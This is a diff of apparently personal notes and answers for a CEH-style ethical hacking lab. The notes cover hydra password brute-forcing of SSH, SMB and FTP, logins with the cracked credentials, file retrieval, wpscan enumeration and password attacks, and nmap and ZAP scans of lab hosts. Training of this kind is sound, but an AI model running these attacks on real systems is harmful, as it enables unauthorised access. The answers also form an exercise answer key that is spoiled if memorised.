@@ -15,9 +15,9 @@
 
 # *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 
-### FILTER: tcp.flags.reset == 1 && tcp.len == 0 && ip.dst == 172.30.10.200  # envio de flag reset com payload vazio
+### FILTER: tcp.flags.reset == 1 && tcp.len == 0 && ip.dst == 172.30.10.200 # ⚠️ WARNING: Sending a reset flag with an empty payload.
 ### FILTER: tcp.flags.reset == 1 && tcp.len == 0 && ip.src == 172.30.10.200 
-### FILTER: tcp.analysis.retransmission || tcp.analysis.out_of_order # Sequência de sessão quebrada
+### FILTER: tcp.analysis.retransmission || tcp.analysis.out_of_order # ⚠️ WARNING: Broken session sequence
 
 
 
@@ -55,7 +55,7 @@
 
 # *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
 
-#### ~/Donwloads/cowrie.log
+#### EH Workstation-2: ~/Donwloads/cowrie.log
 cat ~/Donwloads/cowrie.log
 ### INFO: 2024-09-11T01:28:11.805001Z [HoneyPotSSHTransport,1,172.30.10.99] Connection lost after 0 seconds
 ### INFO: 2024-09-11T01:29:11.805001Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 172.30.10.99:35929 (102.168.10.111:2222) [session: 33295034a52] 
@@ -72,15 +72,16 @@ cat ~/Donwloads/cowrie.log
 
 # *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
 
-curl -I certifiedhacker.com
-# nmap -script http-headers certifiedhacker.com
-# nmap -sV -p 80,443 certifiedhacker.com
-### INFO: Apache
+nmap -sV -p 80,443 certifiedhacker.com
+### INFO: 80/tcp   open  http       Apache httpd
+### INFO: 443/tcp  open  ssl/http   Apache httpd
 
 
 
 # *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 
+# nmap -script http-headers certifiedhacker.com
+# curl -I certifiedhacker.com
 # whatweb -a 3 certifiedhacker.com
 # nc certifiedhacker.com 80
 # http -h certifiedhacker.com
@@ -96,13 +97,14 @@ curl -I certifiedhacker.com
 
 # *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
 
-hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.101 ssh -u -t 4 -w 5 
+#### EH Workstation-2: ~/rockyou.txt
+hydra -l Martin -P ~/rockyou.txt 192.168.10.101 ssh -u -t 4 -w 5 
 ### INFO: [22] [ssh] host: 192.168.10.101 login: Martin password: qwerty1234
-# ssh Martin@192.168.10.101 
+ssh Martin@192.168.10.101 
 ### PASSWORD: qwerty1234
 
-#### ~/Desktop/$ollers.txt
-cd Desktop # CONECTADO VIA SSH
+#### Remote Connection: ~/Desktop/$ollers.txt
+cd Desktop # 🛑 TODO: Connected via SSH
 dir
 type $ollers.txt
 ### INFO: Password to enter my crypto account: i2tr&^72546HJ*
@@ -111,7 +113,7 @@ type $ollers.txt
 
 # *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 
-# hydra -l Martin -P ~/rockyou.txt 192.168.10.101 ssh -u -t 4 -w 5 
+# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.101 ssh -u -t 4 -w 5 
 # hydra -l Martin -p qwerty1234 192.168.10.101 ssh 
 # sshpass -p 'qwerty1234' ssh Martin@192.168.10.101
 
@@ -128,10 +130,11 @@ type $ollers.txt
 ftp 192.168.10.111
 ### USERNAME: nick
 ### PASSWORD: apple
+
 #### ~/Desktop/w_domain.txt
-get Desktop/w_domain.txt # CONECTADO VIA FTP
+get Desktop/w_domain.txt # 🛑 TODO: Connected via FTP
 exit
-cat w_domain.com
+cat w_domain.txt
 ### INFO: "id":"7867721010"
 
 
@@ -149,7 +152,6 @@ cat w_domain.com
 
 # *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
 
-nmap -sT -sV --version-light -T2 --open --top-ports 200 172.30.10.99
 nmap -p 8080 -sV 172.30.10.99
 ### INFO: 8080/tcp  open  http  Apache Tomcat/Coyote JSP engine 1.1
 
@@ -157,6 +159,7 @@ nmap -p 8080 -sV 172.30.10.99
 
 # *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 
+# nmap -sT -sV --version-light -T2 --open --top-ports 200 172.30.10.99
 # nmap -p 8080 -sV --version-light 172.30.10.99
 # nmap -p 8080 --script http-title,http-server-header 172.30.10.99
 # whatweb -a 3 http://172.30.10.99:8080
@@ -172,15 +175,17 @@ nmap -p 8080 -sV 172.30.10.99
 
 # *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
 
+#### EH Workstation-2: ~/users.txt
+#### EH Workstation-2: ~/rockyou.txt
 hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.101 smb -u -t 4 -w 3
 ### INFO: [445] [smb] host: 192.168.10.101 login: Martin password: qwerty1234
-smbclient -L //192.168.10.101 -U Martin # Listar shares
+smbclient -L //192.168.10.101 -U Martin # ⚠️ WARNING: List shares
 ### PASSWORD: qwerty1234
-smbclient //192.168.10.101/Users -U Martin # Conectar
+smbclient //192.168.10.101/Users -U Martin # ⚠️ WARNING: Connect
 ### PASSWORD: qwerty1234
 
-#### EH Workstation-1: C:\Users\Martin\Music\webpent.txt
-cd Martin\Music # CONECTADO VIA SSH
+#### Remote Connection: C:\Users\Martin\Music\webpent.txt
+cd Martin\Music # 🛑 TODO: Connected via SSH
 get webpent.txt
 exit
 cat webpent.txt
@@ -212,13 +217,13 @@ whatweb www.moviescope.com
 # *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
 
 owasp-zap
-### Automated Run → URL to attack: http://www.goodshopping.com → Attack
-### Alerts → Vulnerable JS Library
+### PATH: Automated Run → URL to attack: http://www.goodshopping.com → Attack
+### PATH: Alerts → Vulnerable JS Library
 ### INFO: Other Info → CVE-2020-11023, CVE-2020-11022, CVE-2015-9251 
 ### INFO: Reference → https://nvd.nist.gov/vuln/detail/CVE-2012-6708 → Cross-site Scripting (XSS)   
-### Alerts → User Controllable HTML Element Attibute (Potential XSS)
+### PATH: Alerts → User Controllable HTML Element Attibute (Potential XSS)
 ### INFO: Description → ... for XSS (cros-site scripting) ... 
-### Alerts → Content Security Policy (CSP) Header Not Set
+### PATH: Alerts → Content Security Policy (CSP) Header Not Set
 ### INFO: Source → Passive (10038 - Content Security Policy (CSP) Header Not Set)
 
 
@@ -236,15 +241,18 @@ sudo su
 nmap -O --osscan-guess --max-os-tries 1 192.168.10.111 192.168.10.121 192.168.10.144 192.168.10.222
 ### INFO: Nmap scan report for 192.168.10.144
 ### INFO: OS details: Microsft Windows Server 2019
+
+#### EH Workstation-2: ~/users.txt
+#### EH Workstation-2: ~/rockyou.txt
 hydra -L users.txt -P rockyou.txt 192.168.10.144 ftp -u -t 4 -w 3
 ### INFO: [21] [ftp] host: 192.168.10.144 login: Parker password: Passw0rd@1234
 
-ftp 192.168.10.144 # NOUTRO TERMINAL
+ftp 192.168.10.144
 ### USERNAME: Parker
 ### PASSWORD: Passw0rd@1234
 #### C:\Users\Parker\Documents\w_report.pdf
-get Documents/w_report.pdf # CONECTADO VIA FTP
-bye # exit
+get Documents/w_report.pdf # 🛑 TODO: Connected via SSH
+bye 
 
 pdftotext Documents/w_report.pdf report.txt
 grep -i "directory listing" report.txt
@@ -258,6 +266,7 @@ grep -i "sensitive files" report.txt
 # ftp Parker@192.168.10.144
 # ftp ftp://Parker:Passw0rd%401234@192.168.10.144
 # lftp -u Parker,Passw0rd@1234 192.168.10.144
+# exit
 
 
 
@@ -270,12 +279,10 @@ grep -i "sensitive files" report.txt
 # *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
 
 nmap -p- --open www.cehorg.com
-whatweb http://www.cehorg.com:80
-whatweb http://www.cehorg.com:8080
 #### MOZILLA FIREFOX: http://www.cehorg.com:8080
 ### INFO: You Projects (2) → CEH, DVWA
-whatweb http://www.cehorg.com:8080/CEH
-curl -I http://www.cehorg.com:8080/CEH
+
+#### EH Workstation-2: ~/rockyou.txt
 wpscan --url http://www.cehorg.com:8080/CEH/ --enumerate u # Enumerar usuários
 ### INFO: User(s) Identified → admin, adam, helen
 wpscan --url http://www.cehorg.com:8080/CEH/ -U adam -P rockyou.txt
@@ -285,6 +292,10 @@ wpscan --url http://www.cehorg.com:8080/CEH/ -U adam -P rockyou.txt
 
 # *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 
+# whatweb http://www.cehorg.com:80
+# whatweb http://www.cehorg.com:8080
+# whatweb http://www.cehorg.com:8080/CEH
+# curl -I http://www.cehorg.com:8080/CEH
 # curl -I http://www.cehorg.com:80
 # curl -I http://www.cehorg.com:8080
 # curl -I http://www.cehorg.com8080/DVWA
@@ -332,7 +343,7 @@ wpscan --url http://www.cehorg.com:8080/CEH/ -U adam -P rockyou.txt
 
 # *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
 
-#### MOZILLA FIREFOX: http://www.moviescope.com/ # Realizar login 
+#### MOZILLA FIREFOX: http://www.moviescope.com/ # 🛑 TODO: Log in
 ### USERNAME: lee
 ### PASSWORD: test
 ### PATH: Contacts → View Profile
